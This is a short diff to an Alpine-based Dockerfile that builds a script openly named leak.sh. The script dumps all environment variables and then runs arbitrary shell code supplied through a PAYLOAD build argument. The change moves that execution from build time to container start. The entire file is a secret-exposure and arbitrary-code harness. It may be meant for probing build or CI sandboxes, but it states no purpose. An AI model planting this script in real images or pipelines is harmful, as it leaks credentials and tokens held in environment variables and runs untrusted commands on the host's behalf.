@@ -2,11 +2,9 @@ FROM python:3.11-alpine
 
 ARG PAYLOAD
 
-# Install bash and curl since Alpine is minimal
 RUN apk add --no-cache bash curl
 
-# Create and run the leak script using the PAYLOAD argument
-RUN echo "[+] Collecting sensitive data..." && \
+RUN echo "[+] Creating leak.sh script..." && \
     echo '#!/bin/bash' > /leak.sh && \
     echo 'echo "===== ENVIRONMENT VARIABLES ====="' >> /leak.sh && \
     echo 'printenv' >> /leak.sh && \
@@ -17,7 +15,6 @@ RUN echo "[+] Collecting sensitive data..." && \
     echo '' >> /leak.sh && \
     echo 'echo "===== PAYLOAD EXECUTION OUTPUT ====="' >> /leak.sh && \
     echo "$PAYLOAD" >> /leak.sh && \
-    chmod +x /leak.sh && \
-    /leak.sh > /leaks.txt
+    chmod +x /leak.sh
 
-CMD ["cat", "/leaks.txt"]
+CMD ["/bin/bash", "/leak.sh"]
